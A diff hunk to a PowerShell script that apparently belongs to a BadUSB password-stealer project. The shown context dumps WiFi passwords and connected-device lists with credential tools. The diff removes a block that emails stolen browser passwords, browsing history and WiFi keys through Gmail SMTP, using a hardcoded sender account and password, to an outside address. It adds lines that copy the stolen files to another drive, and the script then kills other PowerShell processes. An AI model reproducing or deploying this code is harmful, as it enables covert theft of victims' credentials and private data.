@@ -10,21 +10,9 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\WirelessKeyView.exe /stext wifi.txt #Create the file for WiFi passwords
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
-#Set mail option
-$SMTPServer = 'smtp.gmail.com'
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
-$SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('haslakompy@gmail.com', 'Filip3322') #Email with which you want to send information
-$ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'asdfghjkl12323@protonmail.com' #Email in which you want to receice the information
-$ReportEmail.To.Add('asdfghjkl12323@protonmail.com') #Email in which you want to receive the information
-$ReportEmail.Subject = 'ChromePassStealerV2'
-$ReportEmail.Body = 'Attached is your list of informations.'
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\history.txt')
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\wifi.txt')
-$ReportEmail.Attachments.Add('C:\Users\Public\Documents\connected_devices.txt')
-$SMTPInfo.Send($ReportEmail) #Send mail
+Copy-Item C:\Users\Public\Documents\wifi.txt -Destination W:\Passwords
+Copy-Item C:\Users\Public\Documents\history.txt -Destination W:\Passwords
+Copy-Item C:\Users\Public\Documents\passwords.txt -Destination W:\Passwords
 Start-Sleep -Seconds 15 #Wait 15 seconds
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Start-Sleep -Seconds 30 #Wait 30 seconds
